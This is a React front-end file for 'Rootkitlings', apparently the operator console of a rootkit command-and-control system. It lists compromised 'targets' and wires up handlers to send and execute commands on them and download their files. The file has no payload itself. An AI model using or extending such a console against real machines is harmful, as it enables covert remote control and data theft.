import { useState, useEffect, useCallback } from 'react'
import { LayoutDashboard, Activity, Radio, Wifi, WifiOff, PanelLeftClose, PanelLeftOpen, RefreshCw } from 'lucide-react'
import { useWs } from './hooks/useWs'
import { ToastProvider, useToast } from './components/Toast'
import { Home } from './pages/Home'
import { Target, DownloadOverlay, PreviewModal } from './pages/Target'
import { Events } from './pages/Events'

export default function App() {
  return (
    <ToastProvider>
      <Shell />
    </ToastProvider>
  )
}

function Shell() {
  const { targets, events, log, connected, sendCmd, query, execCmd, downloadFile, refresh, renameTarget, watchTarget } = useWs()
  const { toast } = useToast()
  const [page, setPage] = useState({ view: 'home', targetId: null })
  const [collapsed, setCollapsed] = useState(false)
  const [downloads, setDownloads] = useState({})

  const startDownload = useCallback((path, targetId) => {
    const key = `${targetId}\0${path}`
    setDownloads(s => ({ ...s, [key]: { state: 'pending', received: 0, total: 0, targetId, path } }))
    const onProgress = (received, total) => {
      setDownloads(s => ({ ...s, [key]: { ...s[key], received, total } }))
    }
    return downloadFile(path, targetId, onProgress).then(r => {
      if (r.ok) {
        const raw = Uint8Array.from(atob(r.data), c => c.charCodeAt(0))
        setDownloads(s => ({ ...s, [key]: { ...s[key], state: 'done', raw, size: r.size } }))
        return { ok: true, raw, size: r.size }
      }
      setDownloads(s => ({ ...s, [key]: { ...s[key], state: 'error', error: r.error || 'unknown' } }))
      setTimeout(() => setDownloads(s => { const n = { ...s }; delete n[key]; return n }), 5000)
      return { ok: false, error: r.error }
    })
  }, [downloadFile])

  const sendCmdWithToast = useCallback((cmd, targetId) => {
    toast(`Sent: ${cmd}`, 'info', 2000)
    sendCmd(cmd, targetId)
  }, [sendCmd, toast])

  useEffect(() => {
    document.documentElement.setAttribute('data-theme', 'light')
  }, [])

  useEffect(() => {
    const handler = () => {
      const hash = location.hash || '#/'
      const m = hash.match(/^#\/target\/(.+)$/)
      if (m) {
        const tab = window.__rkl_initial_tab
        delete window.__rkl_initial_tab
        setPage({ view: 'target', targetId: decodeURIComponent(m[1]), initialTab: tab || null })
      }
      else if (hash === '#/events') setPage({ view: 'events', targetId: null })
      else setPage({ view: 'home', targetId: null })
    }
    window.addEventListener('hashchange', handler)
    handler()
    return () => window.removeEventListener('hashchange', handler)
  }, [])

  const navigate = (hash) => { location.hash = hash }
  const selectedTarget = targets.find(t => t.id === page.targetId)
  const online = targets.filter(t => t.online).length

  useEffect(() => {
    if (page.view === 'target' && targets.length && !selectedTarget)
      navigate('#/')
  }, [page.view, targets, selectedTarget])

  useEffect(() => {
    watchTarget(page.targetId)
    return () => watchTarget(null)
  }, [page.targetId, watchTarget])

  return (
    <div className="flex h-screen overflow-hidden bg-bg">
      {/* Sidebar: full or icon-only */}
      <aside className={`${collapsed ? 'w-14' : 'w-52'} shrink-0 border-r-2 border-border bg-secondary flex flex-col transition-all duration-200`}>
        {/* Logo */}
        <div className={`flex items-center gap-2 border-b-2 border-border ${collapsed ? 'px-2 py-3 justify-center' : 'px-3 py-3'}`}>
          <div className="w-8 h-8 bg-main rounded-[var(--radius)] flex items-center justify-center border-2 border-border shadow-[2px_2px_0px_0px_var(--color-border)] shrink-0">
            <Radio size={14} className="text-main-fg" />
          </div>
          {!collapsed && <span className="font-bold text-sm tracking-tight">Rootkitlings</span>}
        </div>

        {/* Nav */}
        <nav className="p-1.5 space-y-0.5">
          <NavItem icon={LayoutDashboard} label="Dashboard" active={page.view === 'home'} collapsed={collapsed} onClick={() => navigate('#/')} />
          <NavItem icon={Activity} label="Events" active={page.view === 'events'} collapsed={collapsed} onClick={() => navigate('#/events')} />
        </nav>

        {/* Targets */}
        <div className={`flex-1 overflow-auto ${collapsed ? 'px-1.5' : 'px-3'} py-2`}>
          {!collapsed && <div className="text-[9px] font-bold uppercase tracking-widest text-fg-3 mb-1.5 px-1">Targets</div>}
          <div className="space-y-0.5">
            {targets.map(t => (
              <button
                key={t.id}
                title={collapsed ? (t.label || (t.hostname && t.hostname !== '(none)' ? t.hostname : t.id)) : undefined}
                className={`w-full flex items-center gap-2 text-sm text-left rounded-[var(--radius)] border-2 transition-all
                  ${collapsed ? 'p-1.5 justify-center' : 'px-2 py-1.5'}
                  ${page.targetId === t.id
                    ? 'bg-main text-main-fg border-border font-bold shadow-[2px_2px_0px_0px_var(--color-border)]'
                    : 'border-transparent hover:border-border hover:bg-bg-2'}`}
                onClick={() => navigate(`#/target/${encodeURIComponent(t.id)}`)}
              >
                <span className={`w-2 h-2 rounded-full shrink-0 ${t.online ? 'bg-green pulse' : 'bg-red'}`} />
                {!collapsed && <>
                  <span className="truncate">{t.label || (t.hostname && t.hostname !== '(none)' ? t.hostname : t.id)}</span>
                </>}
              </button>
            ))}
          </div>
        </div>

        {/* Footer */}
        <div className={`border-t-2 border-border ${collapsed ? 'p-1.5' : 'px-3 py-2'} flex flex-col gap-1.5`}>
          <div className={`flex items-center gap-1.5 ${collapsed ? 'justify-center' : 'px-1'}`}>
            <span className={`w-2 h-2 rounded-full shrink-0 ${connected ? 'bg-green pulse' : 'bg-red'}`} />
            {!collapsed && (
              <span className={`text-[10px] font-bold uppercase tracking-wider ${connected ? 'text-green' : 'text-red'}`}>
                {connected ? 'Connected' : 'Disconnected'}
              </span>
            )}
          </div>
          <button
            className={`nb-btn w-full flex items-center justify-center ${collapsed ? 'p-1' : 'p-1.5'} text-fg-3`}
            onClick={() => setCollapsed(!collapsed)}
            title={collapsed ? 'Expand sidebar' : 'Collapse sidebar'}
          >
            {collapsed ? <PanelLeftOpen size={14} /> : <PanelLeftClose size={14} />}
          </button>
        </div>
      </aside>

      {/* Main */}
      <div className="flex-1 flex flex-col min-w-0">
        <header className="flex items-center justify-between px-4 py-1.5 border-b-2 border-border bg-secondary">
          <span className="text-[10px] font-bold text-fg-3 uppercase tracking-widest">Operator Console</span>
          <div className="flex items-center gap-2">
            <span className="text-[10px] font-mono text-fg-3">{online}/{targets.length} online</span>
            <button className="nb-btn p-1" onClick={refresh} title="Refresh">
              <RefreshCw size={12} />
            </button>
            <div className={`nb-badge text-[9px] py-0.5 ${connected ? 'bg-green text-white' : 'bg-red text-white'}`}>
              <span className={`w-1.5 h-1.5 rounded-full bg-current ${connected ? 'pulse' : ''}`} />
              {connected ? 'LIVE' : 'OFFLINE'}
            </div>
          </div>
        </header>

        <main className="flex-1 overflow-auto bg-bg">
          {page.view === 'home' && (
            <Home targets={targets} onNavigate={(id, tab) => {
                if (tab) window.__rkl_initial_tab = tab
                navigate(`#/target/${id}`)
              }} />
          )}
          {page.view === 'target' && (
            <Target target={selectedTarget} initialTab={page.initialTab} log={log} events={events} sendCmd={sendCmdWithToast} query={query} execCmd={execCmd} startDownload={startDownload} downloads={downloads} onBack={() => navigate('#/')} renameTarget={renameTarget} refresh={refresh} />
          )}
          {page.view === 'events' && (
            <Events events={events} onRefresh={refresh} />
          )}
        </main>
      </div>
      <DownloadOverlay downloads={downloads} setDownloads={setDownloads} targetId={page.targetId} targets={targets} />
      <PreviewModal downloads={downloads} setDownloads={setDownloads} />
    </div>
  )
}

function NavItem({ icon: Icon, label, active, collapsed, onClick }) {
  return (
    <button
      title={collapsed ? label : undefined}
      className={`w-full flex items-center gap-2 text-sm font-semibold rounded-[var(--radius)] border-2 transition-all
        ${collapsed ? 'p-1.5 justify-center' : 'px-2.5 py-1.5'}
        ${active
          ? 'bg-main text-main-fg border-border shadow-[2px_2px_0px_0px_var(--color-border)]'
          : 'border-transparent hover:border-border hover:bg-bg-2'}`}
      onClick={onClick}
    >
      <Icon size={16} />
      {!collapsed && label}
    </button>
  )
}
